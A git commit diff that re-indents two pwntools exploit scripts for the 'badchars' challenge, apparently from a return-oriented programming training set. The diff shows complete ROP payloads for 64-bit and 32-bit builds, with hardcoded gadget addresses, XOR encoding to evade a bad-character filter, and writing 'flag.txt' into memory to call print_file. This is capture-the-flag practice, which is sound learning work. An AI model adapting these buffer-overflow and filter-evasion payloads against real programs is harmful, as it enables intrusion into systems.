c2477a43672d51898fe5a70c4ac0fa538150ef33
Andrew Timkov <andrew.timkov@gmail.com>
2022-08-09 22:47:41 +1000

    Fix badchars indentation

--- badchars.py
+++ badchars.py
@@ -9,48 +9,48 @@ elf = p.elf
 rop = ROP(elf)
 
 if args.ATTACH:
-	gdb.attach(p, '''break main''')
-	sleep(5)
+    gdb.attach(p, '''break main''')
+    sleep(5)
 
 bad_bytes = b'xga.'
 # this XOR will just capitalise essentially
 bitmask = 1 << 5
 
 data_addr = 0x0000000000601028
-mov_ptr_r13_r12_addr = 0x0000000000400634 		# mov qword ptr [r13], r12; ret;
-pop_r12_r13_r14_r15_addr = 0x000000000040069c	# pop r12; pop r13; pop r14; pop r15; ret;
-xor_ptr_r15_r14_addr = 0x0000000000400628 		# xor byte ptr [r15], r14b; ret;
-pop_r15_addr = 0x00000000004006a2 				# pop r15; ret;
-pop_rdi_addr = 0x00000000004006a3 				# pop rdi; ret;
+mov_ptr_r13_r12_addr = 0x0000000000400634       # mov qword ptr [r13], r12; ret;
+pop_r12_r13_r14_r15_addr = 0x000000000040069c   # pop r12; pop r13; pop r14; pop r15; ret;
+xor_ptr_r15_r14_addr = 0x0000000000400628       # xor byte ptr [r15], r14b; ret;
+pop_r15_addr = 0x00000000004006a2               # pop r15; ret;
+pop_rdi_addr = 0x00000000004006a3               # pop rdi; ret;
 p.recvuntil(b'> ')
 
 payload = b'A' * (0x20 + 0x8)
 
 for i, string in enumerate([b'flag.txt', b'\x00'*8]):
-	# build our string, 8 bytes at a time
+    # build our string, 8 bytes at a time
 
-	payload += p64(pop_r12_r13_r14_r15_addr)
+    payload += p64(pop_r12_r13_r14_r15_addr)
 
-	# xor badchars to bypass badchars check
-	# if we don't limit xor to badchars,
-	# we actually exceed an 0x200 byte payload
-	for c in string:
-		if c in bad_bytes:
-			payload += p8(c ^ bitmask)
-		else:
-			payload += p8(c)
+    # xor badchars to bypass badchars check
+    # if we don't limit xor to badchars,
+    # we actually exceed an 0x200 byte payload
+    for c in string:
+        if c in bad_bytes:
+            payload += p8(c ^ bitmask)
+        else:
+            payload += p8(c)
 
-	payload += p64(data_addr + i*8)
-	payload += p64(bitmask)
-	payload += b'AAAAAAAA'
-	payload += p64(mov_ptr_r13_r12_addr)
+    payload += p64(data_addr + i*8)
+    payload += p64(bitmask)
+    payload += b'AAAAAAAA'
+    payload += p64(mov_ptr_r13_r12_addr)
 
-	for j in range(8):
-		if string[j] in bad_bytes:
-			# in-memory data manipulation to undo xor
-			payload += p64(pop_r15_addr)
-			payload += p64(data_addr + i*8 + j)
-			payload += p64(xor_ptr_r15_r14_addr)
+    for j in range(8):
+        if string[j] in bad_bytes:
+            # in-memory data manipulation to undo xor
+            payload += p64(pop_r15_addr)
+            payload += p64(data_addr + i*8 + j)
+            payload += p64(xor_ptr_r15_r14_addr)
 
 
 # with our .data set up, we can call print_file
--- badchars32.py
+++ badchars32.py
@@ -9,42 +9,42 @@ elf = p.elf
 rop = ROP(elf)
 
 if args.ATTACH:
-	gdb.attach(p, '''break main''')
+    gdb.attach(p, '''break main''')
 
 bad_bytes = b'xga.'
 # ascii is 0-127, so we can just xor 128
 bitmask = 1<<7
 
 data_addr = 0x0804a018
-mov_ptr_edi_addr = 0x0804854f # mov dword ptr [edi], esi; ret;
-pop_esi_edi_ebp_addr = 0x080485b9 # pop esi; pop edi; pop ebp; ret;
-xor_ptr_ebp_bl = 0x08048547 # xor byte ptr [ebp], bl; ret;
-pop_ebp = 0x080485bb # pop ebp; ret;
-pop_ebx = 0x0804839d # pop ebx; ret;
+mov_ptr_edi_addr = 0x0804854f       # mov dword ptr [edi], esi; ret;
+pop_esi_edi_ebp_addr = 0x080485b9   # pop esi; pop edi; pop ebp; ret;
+xor_ptr_ebp_bl = 0x08048547         # xor byte ptr [ebp], bl; ret;
+pop_ebp = 0x080485bb                # pop ebp; ret;
+pop_ebx = 0x0804839d                # pop ebx; ret;
 p.recvuntil(b'> ')
 
 payload = b'A' * (0x28 + 0x4)
 
 for i, string in enumerate([b'flag', b'.txt', b'\x00'*4]):
-	# build our string, 4 bytes at a time
+    # build our string, 4 bytes at a time
 
-	payload += p32(pop_ebx)
-	payload += p32(bitmask)
-	payload += p32(pop_esi_edi_ebp_addr)
+    payload += p32(pop_ebx)
+    payload += p32(bitmask)
+    payload += p32(pop_esi_edi_ebp_addr)
 
-	# xor each byte to bypass badchars check
-	for c in string:
-		payload += p8(c ^ bitmask)
+    # xor each byte to bypass badchars check
+    for c in string:
+        payload += p8(c ^ bitmask)
 
-	payload += p32(data_addr + i*4)
-	payload += b'AAAA'
-	payload += p32(mov_ptr_edi_addr)
+    payload += p32(data_addr + i*4)
+    payload += b'AAAA'
+    payload += p32(mov_ptr_edi_addr)
 
-	for j in range(4):
-		# in-memory data manipulation to undo xor
-		payload += p32(pop_ebp)
-		payload += p32(data_addr + i*4 + j)
-		payload += p32(xor_ptr_ebp_bl)
+    for j in range(4):
+        # in-memory data manipulation to undo xor
+        payload += p32(pop_ebp)
+        payload += p32(data_addr + i*4 + j)
+        payload += p32(xor_ptr_ebp_bl)
 
 
 # with our .data set up, we can call print_file
